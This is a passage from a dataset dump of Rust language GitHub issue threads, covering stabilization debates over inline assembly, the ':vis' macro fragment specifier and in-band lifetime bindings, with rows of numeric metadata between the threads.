can use the nightly channel too, I just wanted to push a little in the pragmatic direction of stabilization of the feature.  @friend There are plenty of use-cases for which intrinsics aren't enough. Of the top of my head of recent stuff where I thought ""why oh why doesn't Rust have stable asm?"", there's no XACQUIRE/XRELEASE intrinsics. Stable inline asm is critical and no, the intrinsics aren't enough.  My original point was attempting to help someone have the ability to write faster code. They made no mention of knowing that intrinsics were even available, and that's all I sought to share. The rest was background information. I'm not even advocating for a specific point of view, so please don't attempt to argue with me — I have no stake in this race. I'm simply repeating what the current point of view is as I understand it. I participate in a project that requires inline assembly that is highly unlikely to have intrinsics in any near future, so I am also interested in some amount of stable inline assembly, but nightly assembly doesn't unduly bother me, nor does invoking an assembler. Yes, there are cases that require assembly for now and there are cases that will forever need it, I said as much originally (added emphasis for clarity) It is my opinion that if you want to see stable assembly, someone (or a group of people) are going to need to get general consensus from the Rust team on a direction to start in and then put in a lot of effort to actualize it.  I still don't understand what instructions you need to access that you can't without inline assembly. Or is it just a specific sequence of arithmetic instructions? If so, have you benchmarked an equivalent Rust source against the inline assembly?  Well, when you are talking about assembly in math, you are basically talking about using the SIMD registers and instructions like _mm256_mul_pd, _mm256_permute2f128_pd, etc. and vectorization operations where it proceed. The thing is that you can take different approaches for vectorization, and usually it's a little trial and error until you get an optimized performance for the processor you are targeting and the use you have in mind. So usually at the library level you first have to query the processor injecting asm code to know the set of instructions and registers supported, and then conditional compiling an specific version of your math asm kernel. Right now I have no specific test at hand, and I'm on holiday, so I would prefer to not involve myself with it a lot, but yeah, if you give me a couple of weeks I can post a performance comparative. In any case, it use to be impossible for the compiler to produce code as fast as you can with manual tuned assembly. It's not possible in C at least, even if you use the classical performance techniques like manual loop unrolling where needed, etc., so I imagine it should be not possible in Rust.  Taylor Cramer suggested I post here. Forgive me as I haven't read through all comments to come up to speed with the current state of the discussion; this is only a voice of support and statement of our situation. For a bare-metal project at Google, we'd love to see some movement on stabilizing inline and module-level assembler. The alternative is using the FFI to call functions written in pure assembly and assembled separately and linked together into a binary. We could define functions in assembler and call them via the FFI, linking them in a separate step, but I know of no serious bare-metal project that does that exclusively, as it has drawbacks in terms of both complexity and performance. Redox uses 'asm!'. The usual suspects of Linux, BSDs, macOS, Windows, etc, all make copious use of inline assembler. Zircon and seL4 do it. Even Plan 9 caved on this a few years ago in the Harvey fork. For performance-critical things, function call overhead might dominate depending on the complexity of the called function. In terms of complexity, defining separate assembler functions just to invoke a single instruction, read or write a register, or otherwise manipulate machine state that's ordinarily hidden from a user-space programmer means more tedious boilerplate to get wrong. In any event, we would have to be more creative in our use of Cargo (or supplement with an external build system or a shell script or something) to do this. Perhaps build.rs could help here, but feeding it into the linker seems more challenging. I'd also very much like it if there were some way to plumb the values of symbolic constants into the assembler template.  The last pre-RFC ( achieved consensus 6 months ago (at least on most of the fundamental issues), so the next step is to submit an RFC that builds on that. If you want this to happen faster I'd recommend contacting @friend about it.  For what it's worth, I need direct access to FS\GS registers to get the pointer to the TEB struct on Windows, I also need a -like intrinsic to apply  to an arbitrary memory location, neither of which I could find a way to do without inline assembly or extern calls. The third point mentioned here concerns me, though, as LLVM indeed prefers to Just Crash if something is wrong providing no error messaging what so ever.  @friend It shouldn't be hard to add that one to , clang implements these using inline assembly ( but we can use that in the std library and expose the intrinsic to safe Rust. Feel encouraged to open an issue in the stdsimd repo about the missing intrinsics.  @friend Ah, I suspected that might be the case. Well, if you want to give it a try, you could translate the assembly into  intrinsic calls and see if you get the same performance out of it. If you don't, please file issues. LLVM isn't magic, but at least intrinsics should be as good as asm.  @friend If you don't mind me asking, are there any usecases/platform features in particular that require inline assembly, in your situation? @friend Maybe we should expose intrinsics for reading the ""segment"" registers? &lt;hr/&gt;  Maybe we should do some data collection and get a breakdown of what people really want  for, and see how many of those could be supported in some other way.  I want  for  working around intrinsics not provided by the compiler working around compiler bugs / sub-optimal code generation performing operations that cannot be performed via a sequence of single intrinsics calls, e.g., a read EFLAGS-modify-write EFLAGS where LLVM is allowed to modify eflags between the read and the write, and where LLVM also assumes that the user won't modify this behind its back (that is, the only way to safely work with EFLAGS is to write the read-modify-write operations as a single atomic  block).  I don't see any other way of supporting any of those use cases that doesn't involve some form of inline assembly but my mind is open.  Copied from my post in the pre-RFC thread, here is some inline assembly (ARM64) which I am using in my current project  @friend note that @friend is working towards the intrinsics for ARM. Would be worth checking to see if that proposal covers your needs.  @friend It is worth remarking that  this work doesn't replace inline assembly, it merely complements it. This approach implements vendor APIs in , these APIs are insufficient for some people already.  this approach is only usable when a sequence of intrinsic calls like  produces code indistinguishable from that sequence of instructions  - this isn't necessarily the case, and when it isn't, code that looks correct produces at best incorrect results, and at worst has undefined behavior (we had bugs due to this in  and  in  already, e.g.,  - other architectures have these issues as well).  some intrinsics have immediate mode arguments, which you cannot pass via a function call, so that  won't work. Every solution to this problem is currently a whacky workaround, and in some cases, no workarounds are currently possible in Rust, so we just don't provide some of these intrinsics.   So if the vendor APIs are implementable in Rust, available on , and can be combined to solve a problem, I agree that they are better than inline assembly. But every now and then either the APIs are not available, maybe not even implementable, and / or they cannot be combined correctly. While we could fix the ""implementability issues"" in the future, if what you want to do is not exposed by the vendor API, or the APIs cannot be combined, this approach won't help you.  What can be very surprising about LLVM's implementation of intrinsics (SIMD especially) is that they do not conform to Intel's explicit mapping of intrinsics to instructions at all - they are subject to a wide range of compiler optimizations. For instance I remember one time where I attempted to reduce memory pressure by calculating some constants from other constants instead of loading them from memory. But LLVM simply proceeded to constant-fold the entire thing back into the exact memory load I was trying to avoid. In a different case I wanted to investigate replacing a 16-bit shuffle with an 8-bit shuffle to reduce port5 pressure. Yet in its unending wisdom the ever-helpful LLVM optimizer noticed that my 8-bit shuffle is in fact a 16-bit shuffle and replaced it. Both optimizations certainly yield better throughput (especially in the face of hyperthreading) but not the latency reduction I was hoping to achieve. I ended up dropping down all the way to nasm for that experiment but having to rewrite the code from intrinsics to plain asm was just unnecessary friction. Of course I want the optimizer to handle things like instruction selection or constant folding when using some high-level vector API. But when I explicitly decided which instructions to use I really don't want the compiler to mess around with that. The only alternative is inline asm.  That's all I've been saying at first and again This is the same thing that @friend is saying in parallel. I'm unclear why multiple people are acting like I'm completely disregarding the usefulness of inline assembly while trying to point out the realities of the current situation. I've  Pointed one poster who made no mention of knowing that intrinsics existed towards stable today intrinsics. Pointed another poster at proposed intrinsics so they can provide early feedback to the proposal.  Let me state this very clearly yes, inline assembly is sometimes required and good. I am not arguing that. I am only trying to help people solve real world problems with the tools that are available now.  What I was trying to say was that we should have a more organized approach to this, a proper survey, and gather up a lot more data than the few of us in this thread, and then use that to point out the most common needs from inline assembly (since it's clear that intrinsics can't fully replace it). I suspect that each architecture has a tricky-to-model subset, that gets some use from inline , and maybe we should focus on those subsets, and then try to generalize. cc @friend/lang  @friend require is a strong word, and I would be compelled to say that no we're not strictly required to use inline assembler. As I mentioned earlier, we could define procedures in pure assembly language, assemble them separately, and link them into our Rust programs via the FFI. However, as I said earlier I know of no serious OS-level project that does that. It would mean lots of boiler plate (read more chances to make a mistake), a more complex build process (right now we're fortunate enough that we can get away with a simple  invocation and a linked and nearly-ready-to-run kernel pops out of the other end; we'd have to invoke the assembler and link in a separate step), and a drastic decrease in the ability to inline things, etc; there would almost certainly be a performance hit. Things like compiler intrinsics help in a lot of cases, but for things like the supervisory instruction set of the target ISA, particularly more esoteric hardware features (hypervisor and enclave features, for example), there often aren't intrinsics and we're in a no_std environment. What intrinsics are there often aren't sufficient; e.g., the x86-interrupt calling convention seems cool but doesn't give you mutable access to the general purpose registers in a trap frame suppose I take an undefined instruction exception with the intent to do emulation, and suppose the emulated instruction returns a value in %rax or something; the calling convention doesn't give me a good way to pass that back to the call-site, so we had to roll our own. That meant writing my own exception handling code in assembler. So to be honest no, we don't require inline assembler, but it is sufficiently useful that it would almost be a non-starter not to have it.  @friend I am specifically curious about avoiding separate assembling, that is, what kind of assembly you need at all in your project, no matter how you link it in. In your case it seems to be a supervisor/hypervisor/enclave privileged ISA subset, is that correct? Is this by necessity, i.e. do the instructions have requirements which are unreasonably difficult or even impossible to uphold when compiled as intrinsic calls through, e.g. LLVM? Or is this just because they're assumed to be too special-cased to be useful to most developers? For the record, vendor intrinsics are in both  and  (the former is a reexport). cc @friend Can this be implemented in LLVM?  @friend correct; we need the supervisor subset of the ISA. I'm afraid I can't say much more at the moment about our specific use case. To some extent both are true, but on balance i would say the latter is more relevant here. Some things are microarchitecture specific and dependent on specific processor package configurations. Would it be reasonable for a compiler to (for example) expose something as an intrinsic that's part of the privileged instruction subset and conditioned on a specific processor version? I honestly don't know. That's actually really good to know. Thanks!  We already do. For example, the  x86 instructions are implemented and exposed in , not available on all processors, and most of them require privileged mode.  @friend  isn't privileged; did you mean ? I took a look through  and the only privileged instructions I saw in my quick sweep (I didn't do an exhaustive search) were , , , and . I suspect those are intrinsics because they fall into the general  family and don't generate exceptions in real mode, and some folks want to use clang/llvm to compile real-mode code.  @friend yes some of those are the ones I meant (we implement , , , ... in the  module  are available in , so you can use them to write an OS kernel for x86. In user-space they are useless AFAICT (they'll always raise an exception), but we don't have a way to distinguish about this in . We could only expose them in  and not in  though, but since they are already stable, that ship has sailed. Who knows, maybe some OS runs everything in ring 0 someday, and you can use them there...  @friend I don't know why  or  would raise an exception in userspace  is the only one of the family that's defined to generate an exception (#GP if CPL&gt;0), and then only in protected mode (SDM vol.1 ch. 13; vol.2C ch. 5 XSAVES).  and  are useful for implementing e.g. pre-emptive user-space threads, so their presence as intrinsics actually makes sense. I suspect the intrinsic for  was either because someone just added everything from the  family without realizing the privilege issue (that is, assuming it was invocable from userspace), or someone wanted to call it from real mode. That latter may seem far-fetched but I know people are e.g. building real-mode firmware with Clang and LLVM. Don't get me wrong; the presence of LLVM intrinsics in  is great; if I never have to write that silly sequence of instructions to get the results of  into a useful format again, I'll be happy. But the current set of intrinsics are not a substitute for inline assembler when you're writing a kernel or other bare-metal supervisory sort of thing.  @friend when I mentioned  I was referring to some of the intrinsics that are available behind the CPUID bits XSAVE, XSAVEOPT, XSAVEC, etc. Some of these intrinsics require privileged mode. We already do and they are available in stable Rust. I added these intrinsics. We realized the privilege issues and decided to add them anyways because it is perfectly fine for a program depending on to be an OS kernel that wants to use these, and they are harmless in userspace (as in, if you try to use them, your process terminates). Agreed, that's why this issue is still open ;)  @friend sorry, I don't mean to derail this by rabbit-holing on  et al. However, as near as I can tell, the only intrinsics that require privileged execution are those related to  and even then it's not always privileged (again, real-mode doesn't care). It's wonderful that those are available in stable Rust (seriously). The others might be useful in userspace and similarly I think it's great that they're there. However,  and  are a very, very small portion of the privileged instruction set and having added intrinsics for two instructions is qualitatively different than doing so generally and I think the question remains as to whether it's appropriate in general. Consider the  instruction from the VMX extensions, for example; I imagine an intrinsic would do something like execute instruction and then ""return"" . That's sort of an oddly specialized thing to have as an intrinsic. I think otherwise we're in agreement here.  FWIW per the  RFC we can currently only add intrinsics to  that the vendors expose in their APIs. For the case of , Intel exposes them on its C API, so that's why it is ok that's there. If you need any vendor intrinsics that are not currently exposed, open an issue, whether it requires privileged mode or not is irrelevant. If the vendor doesn't expose an intrinsic for it, then  might not be the place for it, but there are many alternatives to that (inline assembly, global asm, calling C, ...).  Sorry, I understood you saying you wrote the intrinsics for  to mean the Intel intrinsics; my earlier comments still apply as to why I think  is an intrinsic then (either an accident by a compiler writer at Intel or because someone wanted it for real mode; I feel like the former would be noticed really quickly but firmware does weird stuff, so the latter wouldn't surprise me at all). Anyway, yes, I think we fundamentally agree intrinsics aren't the place for everything, and that's why we'd like to see asm!() moved to stable. I'm really excited to hear that progress is being made in this area, as you said yesterday, and if we can gently nudge @friend to bubble this up closer to the top of the stack, we'd be happy to do so!  A few additional details and use cases for  When you're writing an operating system, firmware, certain types of libraries, or certain other types of system code, you need full access to platform-level assembly. Even if we had intrinsics that exposed every single instruction in every architecture Rust supports (which we don't come anywhere close to having), that still wouldn't be enough for some of the stunts that people regularly pull with inline assembly. Here are a small fraction of things you can do with inline assembly that you can't easily do in other ways  Collect all the implementations of a particular pattern of instructions in a separate ELF section, and then in loading code, patch that section at runtime based on characteristics of the system you run on. Write a jump instruction whose target gets patched at runtime. Emit an exact sequence of instructions (so you can't count on intrinsics for the individual instructions), so that you can implement a pattern that carefully handles potential interruptions in the middle. Emit an instruction, followed by a jump to the end of the asm block, followed by fault recovery code for a hardware fault handler to jump to if the instruction generates a fault. Emit a sequence of bytes corresponding to an instruction the assembler doesn't know about yet. Write a piece of code that carefully switches to a different stack and then calls another function. Call assembly routines or system calls that require arguments in specific registers.   @friend Ok, I will try the intrinsics approach and see where it takes. You are probably right and that's the best approach for my case. Thank you!  @friend nailed it! These are the exact use cases I had in mind. I would add a couple of other use cases  writing code in weird architectural modes, like BIOS/EFI calls and 16-bit real-mode. writing code with strange/unusual addressing modes (which comes up often in 16-bit real-mode, bootloaders, etc.)   @friend Absolutely! And generalizing a point that has sub-cases in both of our lists translating between calling conventions.  I am closing out #53118 in favor of this issue and copying the PR here for the record. Note that this is from August, but a brief look seems to indicate the situation hasn't changed  The section on inline assembly needs an overhaul; in its present state it implies that the behavior and syntax is tied to  and the rust language in general. Pretty much the entire documentation is specific to x86/x86_64 assembly with the llvm toolchain. To be clear, I am not referring to the assembly code itself, which is obviously platform-specific, but rather the general architecture and usage of inline assembly altogether. I didn't find an authoritative source for the behavior of inline assembly when it comes to ARM target, but per my experimentation and referencing the ARM GCC inline assembly documentation, the following points seem to be completely off  The ASM syntax, as ARM/MIPS (and most other CISC?) use intel-esque syntax with the destination register first. I understood the documentation to mean/imply that inline asm took at&amp;t syntax which was transpiled to actual platform/compiler-specific syntax, and that I should just substitute the names of the x86 registers with that of the ARM registers only. Relatedly, the  option is invalid, as is it causes ""unknown directive"" errors when compiling. Adapting from the ARM GCC inline assembly documentation (for building against  with the  toolchain, it appears that even some basic assumptions about the format of inline assembly are platform-specific. In particular, it seems that for ARM the output register (second macro argument) counts as a register reference, i.e.  refers to the first output register and not the first input register, as is the case with the x86 llvm instructions. At the same time, other compiler-specific features are not present; I can't use named references to registers, only indexes (e.g.  is invalid). (Even for x86/x86_64 targets, the usage of  and  in the inline assembly example is very confusing, as it does not explain why those numbers were chosen.)  I think what threw me the most is the closing statement Which does not seem to be universally true.  A notion of intel vs at&amp;t syntax only exists on x86 (though there may be other cases I'm not aware of). It's unique in that they are two different languages sharing the same set of mnemonics to represent the same set of binary code. The GNU ecosystem has established at&amp;t syntax as the dominating default for the x86 world which is why this is what inline asm defaults to. You are mistaken in that it is very much a direct binding to LLVM's inline assembler expressions which in turn mostly just dump plaintext (after processing substitutions) into the textual assembly program. None of this is unique (or even relevant) to or about today's  as it is entirely platform-specific and completely meaningless beyond the x86 world. This is a direct consequence of the ""dumb""/simple plaintext insertion I described above. As the error message indicates the  directive is unsupported. This is an old and well-known workaround for using intel-style inline-asm with GCC (which emits att style) one would simply write  at the start of the inline asm block, then write some intel-style asm and finally terminate with  to set the assembler back into att mode so it correctly processes the (following) compiler-generated code once again. It's a dirty hack and I remember at least the LLVM implementation having had some weird quirks for a long time so it seems like you're seeing this error because it was finally removed. Sadly, the only correct course of action here is to remove the  option from rustc. Your observation is entirely correct, each platform makes up both its own binary format and its own assembly language. They are completely independent and (mostly) unprocessed by the compiler - which is the entire point of programming in raw assembler! Sadly there is quite a big mismatch between the inline asm implementation of LLVM that rustc exposes and the implementation of GCC (which clang emulates). Without a decision on how to move forward with  there is little motivation in improving this - besides, I outlined the major options a long time ago all of them have clear drawbacks. Since this does not seem to be a priority you're probably going to be stuck with today's  for a few years at least. There are decent workarounds  rely on the optimizer to produce optimal code (with a little nudging you can usually get exactly what you want without ever writing raw assembly yourself) use intrinsics, another quite elegant solution which is better than inline asm in almost every way (unless you need exact control over instruction selection and scheduling) invoke the  crate from  to link a C object with inline asm basically just invoke any assembler you like from , using a C compiler may seem like overkill but saves you the hassle of integrating with the  system    These workarounds apply to all but a small set of very specific edge cases. If you hit one of those (luckily I haven't yet) you're out of luck though. I agree that the documentation is quite lackluster but it's good enough for anyone familiar with inline asm. If you aren't, you probably should not be using it. Don't get me wrong - you should definitely feel free to experiment and learn but as  is unstable and neglected and because there are really good workarounds I would strongly advise against using it in any serious project if at all possible.  You can also invoke the  crate from  to build plain assembly files, which gives the maximum amount of control. I strongly recommend doing exactly this in case the two ""workarounds"" above this do not work for your use-case.  @friend wrote I mean, not entirely out of luck. You just have to use Rust's . I have an edge case that none of your listed workarounds cover here. As you say, if you're familiar with the process from other compilers it's mostly fine. (I have another use case I would like to teach systems programming computer architecture and stuff using Rust instead of C someday. Not having inline assembly would make this much more awkward.) I wish we would make inline assembly a priority in Rust and stabilize it sooner rather than later. Maybe this should be a Rust 2019 goal. I am fine with any of the solutions you list in your nice comment earlier I could live with the problems of any of them. Being able to inline assembly code is for me a prerequisite to writing Rust instead of C everywhere I really need it to be stable.  Please write  a Rust 2019 blog post and express this concern. I think if enough of us do that, we can influence the roadmap.  To clarify my comment above - the problem is that the documentation does not explain just how ""deeply"" the contents of the  macro are parsed/interacted with. I'm familiar with x86 and MIPS/ARM assembly but presumed that llvm had its own assembly language format. I've used inline assembly for x86 before, but was not clear on to what extent the bastardization of asm to brige C and ASM went. My presumption (now invalidated) based off the wording in the rust inline assembly section was that LLVM had its own ASM format that was built to mimic x86 assembly in either at&amp;t or intel modes, and necessarily looked like the x86 examples shown. (What helped me was studying the expanded macro output, which cleared up what was going on) I think there needs to be less abstraction on that page. Make it clearer what gets parsed by LLVM and what gets interpreted as ASM directly. What parts are specific to rust, what parts are specific to the hardware you are running on, and what parts belong to the glue that holds them together.  Recent progress on cross-language LTO makes me wonder if some of the downsides of this avenue can be reduced, effectively inlining this ""external assembly blob"".  Even if this works, I don't want to write my inline assembly in C. I want to write it in Rust. -)  You can compile and link  and  files directly (see for example this crate), which in my book are far enough from C. )  I believe this is not currently feasible as cross-language LTO relies on having LLVM IR and assembly would not generate this.  You can stuff assembly into module level assembly in LLVM IR modules.  Does anyone know what the most recent proposal/current status is? Since the theme of the year is ""maturity and finishing what we started"", it seems like a great opportunity to finally finish up .  Vague plans for an new (to be stabilized) syntax were discussed last February  to those notes @friend and @friend signed up to write an RFC. ",283,68,2048,0,0,1634,48,
rust-lang/rust/41022,0.069806562,rust-lang,rust,Tracking issue for `:vis` macro matcher,5604,60,33,0,1,"Tracks stabilization for accepting  as a fragment specifier in macros, gated by . Introduced in #41012.  I tried in #40984 to parse a pattern like  but the visibility isn't enough to terminate the repetition. It's unclear if this is a systemic issue with  or if it can be worked around.  Is this mature enough to be stabilized?  45388 will be a minor breaking change to  consider .  Shall we stabilize this?  This feature was implemented and tested in  AFAICT there have been no issues or problems since then. @friend fcp merge  Team member @friend has proposed to merge this. The next step is review by the rest of the tagged teams  [ ] @friend [x] @friend [ ] @friend [ ] @friend [ ] @friend [ ] @friend [ ] @friend  No concerns currently listed. Once these reviewers reach consensus, this will enter its final comment period. If you spot a major issue that hasn't been raised at any point in this process, please speak up! See this document for info about what commands tagged team members can give me.  I would like to see a comment pointing out the relevant tests so I can review the behavior. =)  @friend concern if we make further changes to the visibility modifiers as we continue to evolve the module system, will this cause back compat issues here?  I would assume that  will continue to match whatever visibility specifiers are added. Such further changes should be carefully designed to avoid introducing ambiguities. On Wed, Jan 17, 2018 at 939 PM, Nick Cameron notifications@friend.com wrote  I agree with @friend. This is definitely ""a thing"", but I think that to a large extend these ambiguities exist already. For example, introducing the  modifier and the possibility of paths like  introduced an ambiguity that affects the  visibility specifier -- but also tuple structs (same with  style visibility modifiers).  @friend thanks for the examples.  @friend Was your concern adequately addressed, or do you have more questions?  @friend it kind of does. However, we seem to be very close to settling on a final design for modules/visibility reform and it seems to me that waiting another month or so for that before stabilising would be beneficial. Consider the concern resolved if others don't think that meaningfully reduces risk.  @friend hmm -- actually -- now that you mention it =) So the main change there (which is not afaik controversial) is that we are going to add  as a keyword. One would expect the behavior of  to change when  is added, which may of course break macros. This is of course nothing new. ( also adds a measure of ambiguity -- at least in some proposals -- in that paths could plausibly begin with .) I continue to regret that we have format specifiers at all. All that said, I'm still sort of inclined to go forward with . We routinely break macros by extending Rust's grammars, sadly enough. But it'd be nice to know what the approved follow-set of  is, I forget. As long as it's suitably narrow, this shouldn't be a big problem.  The follow set is currently   all identifiers and keywords except  tokens that  meta-var which is ,  or   We may need to change rule 2 to exclude . But why  is outside of the follow-set while  is in it? Or is it just an oversight? 🤔  I can't say I appreciate the fatalistic attitude of ""well, we're going to break macros and assume there's no opposition"". But in that case, perhaps we should hold off stabilizing vis until  is a keyword? On Wed, Mar 7, 2018 at 203 PM, kennytm notifications@friend.com wrote  @friend  is already a keyword...  Yes, I (and @friend I guess) meant it is going to be accepted as a keyword in a new context.  @friend Sorry if I came off too blasé. I'm mostly just embittered with the situation, which I find quite frustrating -- we foresaw the problem, but our solution just didn't work. It annoys me, in part because the simpler solution that we originally had in mind would have worked fine. =) But clearly we are not going to allow this to stop us from modifying our grammar. I hope we can address in Macros 2.0 by changing how fragments work. As far as I know roughly the only scheme that works is to have  consume all token trees until something from the designated ""follow set"" of  is found, and then try to parse those tokens as a , and error if extra tokens are left over. But that's a topic for another thread I suppose. I think it's reasonable.  @friend Now that we've come closer to finalizing the modules system under the 2018 edition, do you feel more comfortable resolving your concern here?  @friend resolved if we make further changes to the visibility modifiers as we continue to evolve the module system, will this cause back compat issues here? (Assuming that  will match  like )  bell This is now entering its final comment period, as per the review above. bell  The final comment period, with a disposition to merge, as per the review above, is now complete.  This is in need of a stabilization PR! There's a stabilization guide on the forge. Please post here if you plan to take this issue! (I'll circulate it around and see if anyone wants to take it as a good first or third PR)  @friend as discussed, I would like to try my hand at doing the stabilisation PR. Will ping if I get stuck  This has been stabilized and the reference has been amended, so this seems done.  I'm popping in here while trying to more fully document the follow-set rules in the reference, and the  discussion above doesn't quite make sense to me. Was the intent to exclude  from the follow-set of ? Because it is currently in it---both because  has  and because  is an identifier other than non-raw . ",26,35,209,0,0,97,13,
rust-lang/rust/44524,0.070068125,rust-lang,rust,Tracking issue for RFC 2115: In-band lifetime bindings,50504,644,344,0,21,"This is a tracking issue for the RFC ""In-band lifetime bindings"" (rust-lang/rfcs#2115). Steps  [ ] Implement the RFC (cc @friend/compiler -- can anyone write up mentoring instructions?) [ ] Adjust documentation (see instructions on forge) [ ] Stabilization PR (see instructions on forge)  Unresolved questions  Is a lint for enforcing multi-character lifetime names in impl headers worthwhile?   @friend Could we word the unresolved question as something like ""what is the appropriate convention, if any"" rather than ""is this particular convention worthwhile""? Thanks!  also, that wasn't the only suggested alternative. There is also completely explicit lifetimes using  This lint is going to require updating a lot of code, including all of our docs and examples. I guess you could just do  but that seems to miss the point. Could we make some kind of interactive rustfix tool to let you choose new lifetime names and have them automatically updated?  @friend Done, thanks!  I expanded the unresolved question a bit.  On the shadowing issue would it be acceptable to simply disallow the shorthand when there are lifetimes in enclosing scopes?  (Partiall) mentoring instructions I'm not sure 100% the best way to implement this yet, but let me start by giving some pointers. Perhaps @friend can elaborate, as he is the last one to touch the relevant code in a serious way, as far as I know. First thing is a kind of list of what the tasks are in the RFC. This is roughly the order in which I think we should approach them. It may even be worth breaking this out into  [ ] Implementing . [ ] Lint against single-use lifetimes (they should be replaced with ). [ ] Enable implicit binders. [ ] Apply to rustc, experimenting with naming conventions (e.g., working through the affect on rustc).  I don't have time for detailed mentoring notes, but here are a few things to start reading into. At present, region resolution etc kind of works like this  During HIR lowering, we insert placeholders for elided lifetimes. After HIR lowering, we run the code in .  This creates the  that, for each , contains a  struct indicating what region is being named. This struct is a bit complicated. =)     To support  we have to do very little  treat it like the existing placeholder lifetimes in  remove the error for literally using  as a lifetime   Sorry that I come “after the battle” (this RFC was accepted during the pre-impl-period rush), but as @friend pointed out applying this lint to existing code bases will likely generate a lot of busy work for questionable benefits. I looked for the rationale for this lint but couldn’t find it.  mentions a “convention”, but doesn’t say why enforcing it is important enough to warn by default. We don’t have such a lint for local variable names or field names, for example. I assume that proposed lints are intended to warn by default. If they’re silent by default I have no concern.  The idea is that there will no longer be  sections in functions, so it will be harder to tell apart lifetime names from  scope and those from function scope. This makes it tricky to know whether a name used in a function is intended to refer to an -scope lifetime, or to define a new one (and should thus be renamed).  @friend Sorry, I have a hard time figuring out if your comment is arguing for or against something, and whether that thing is the lint I mentioned or some other change proposed by this tracking issue.  @friend It's just trying to describe the reasoning behind the lint's existence, not necessarily argue for or against it.  Alright, I understand your previous comment now. I still think that while it might be good to nudge in that direction when writing new code, spewing hundreds of warnings in existing code bases is counter-productive.  What is the desired behavior for  in trait objects? Currently, it behaves just like elided lifetimes and is ignored. I think we want to change this. For example I would personally expect that the second and third versions would be equivalent.  Could we upgrade the  lint to  when the  feature is turned on?  I think it should follow the same rules as all elisions in return types roughly, if there's only one input lifetime, match that one, if its a method, match the method receiver, otherwise, new lifetime. So yea, this example should be equivalent.  Unless they can only occur when using unstable features, please only enable new warnings after the alternative becomes available on the stable channel. (At least.)  @friend I'm not sure I understand you, but I think you're saying that we should not enable lints when you turn on a nightly feature unless the code being linted would not be possible without that nightly feature. Can you elaborate way?  I mean that Nightly should only warn ""Don’t do X, do Y instead"" once Y becomes available on the Stable channel. This is so that a project (for example a library) can choose to support all three release channels and be able to compile without warnings in all of them. An exception to that is if X was unstable, such that code that uses it could not build on Stable anyway.  @friend the intent is to turn the lint on when the feature is turned on (not on all nightlies). You can't have a feature turned on and compile on stable. I understand that when we stabilize the feature, we should not have the lint level follow it until the feature is actually in stable.  And this should be a minimum. If X is extremely common, consider only warning by default in a new epoch. It’s not nice when a large project suddenly starts emitting hundreds of warnings just by switching to a newer compiler.  @friend unfortunately, I think there are still some bugs we need to fix before we upgrade the lint. For example, I found that I was getting warnings in the  macro. I've been meaning to file an issue about that.  Good to know. My reason for prioritizing upgrading the lint is that alexcrichton/futures-await#63 requires users to use  for lifetimes in paths for async functions. This is because we have to unelide lifetimes in a proc macro to add them to the  return type. It seems easier for people using this syntax to just move everything over than to have to use  sometimes and not other times.  This is the problem I was talking about  I created a distinct tracking issue  for , which we aim to stabilize first. @friend, I also filed a bug regarding the behavior of `dyn Trait (and linked it from #48469).  Am I wrong in assuming that we are just experimenting this feature since there are still concerns from the RFC thread? Or is this a feature that is very likely to get stabilized without overwhelming consensus?  That seems to be the case  the same time, though, features get stabilized without ""overwhelming consensus"" all the time. Rust language design isn't a popularity contest.  Nothing is a popularity contest. This does not mean users' legitimate concerns should get ignored in the discussion of a change that has significant impact on them. In the end of day though, team member still decide what to do and what not to do, and users continue to reply on team members' effort to produce useful things. And I personally feel torn between sounding confrontational possibly ungrateful and letting changes I think that may undermine a system language that focuses on correctness and promises boring stability slip through.  @friend Yes and no. I don't think that this feature has yet been evaluated, so that part I agree with. This is mostly due to general lack of bandwidth I would say. I am hoping that will change as get more organized about ensuring all the pieces of the upcoming Epoch (or era, edition, whatever) fall into place. Regarding the feature itself, I personally still feel quite positive about it. I've used it in a few small places and it felt very natural. But I wouldn't feel comfortable recommending or stabilizing it until (a) it is feature complete, (b) in use at least in rustc and ideally other places, and (c) there are effective lints that guide us down the expected path. That said, I do feel good about stabilizing  specifically, which more-or-less meets those criteria (still a bit of work to be done).  I've recently written rather a lot of code where implicit binders would have been rather nice... basically, I have a bunch of containers with methods like  @friend Isn't that one of the cases that elision handles, since  is single-use and the return is borrowed from ?  Sorry, bad example. It's more complicated when there are other lifetimes on the  type that you want some parameters tied to. Also, I can never quite remember when they can be ellided or what the inferred lifetimes are, so I find the explicit lifetimes convenient when it's not obvious.  It looks like #48469 and #15872 are done tada  Could someone update the OP?  🔔 🔔 Note that an early 2018 Edition Preview is now ready, and includes in-band lifetimes. Please take a look and leave feedback here!  On discord recently, someone said And I'm able to confidently say, ""You don't need the "" and suggest With in-band lifetimes, if someone says I can no longer make that statement confidently. Has there been any further progress on how to apply this only in ways/places that doesn't potentially increase confusion?  My first instinct is something like ""cannot mix in-band and from-parent lifetimes"", but that still doesn't make the third code example earlier unambiguous...  I see this more as a style issue. If you are mixing parent and function lifetimes, I think you should not use in band lifetimes. In my limited experience, this mixing case is uncommon so the loss of ergonmics seems justified.  I think that this ship has sailed for other similar concepts. If there's a trait bound on the  block, you don't see it from the method. Whenever trait bounds are implicitly applied on the  block based on the type declaration, there will be even more ""action at a distance"".  I think we should just add a lint already for one-use lifetimes.  How much has this feature been put into use in rustc at this point? That's one of the items listed in the OP, curious what the experience has been.  I'm happy to stabilise but not strongly so - I found in-band lifetimes to be of limited utility, iiuc the current design only lets us skip declaring a lifetime, so it just saves  or similar. I find the declaration necessary only rarely and when it is necessary it's usually a complex signature where the decl doesn't make too much difference. I didn't use the impls thing so much, but that sounds much more useful.  I don't think it's good to defend action-at-a-distance by saying there's already some in the language and we're (probably) going to add more. Lifetime annotations are really confusing, especially for newcomers, and making them harder to trace should be considered very carefully.  As a clarifying question what was the decision on single-letter lifetimes in general? There are several unchecked boxes in the top post before stabilization and that's one of them.  Just to confirm something, do we already have the lint for ""you only used this lifetime once, so it's probably a typo""? I don't want to stabilize this without the typo-catcher.  We could just make this a hard error requiring  to be used instead  @friend I definitely agree. From @friend's experience with #52461, I can say that this feature is really great at introducing lifetimes in an existing codebase, in positions where there were none, with very little friction, and all the footguns were single-use lifetimes.  @friend Sadly that's not the case at all in codebases where the lifetimes are part of the infrastructure, such as  in , which inverts the statistics for when you need certain lifetimes explicitly. I wish we could just make entire modules generic on lifetimes, but atm that's just fantasy.  Can anyone who's transitioned a codebase to in-band lifetimes post the link here, so we can see if it's easier or harder for others to read?  I have ported my crate to Rust 2018 on a branch  If I explicitly declare a lifetime somewhere and mean to use it again but get the name wrong, it doesn't look like there's any way the compiler will be able to catch me.  For example, suppose I refactor to add an outer lifetime 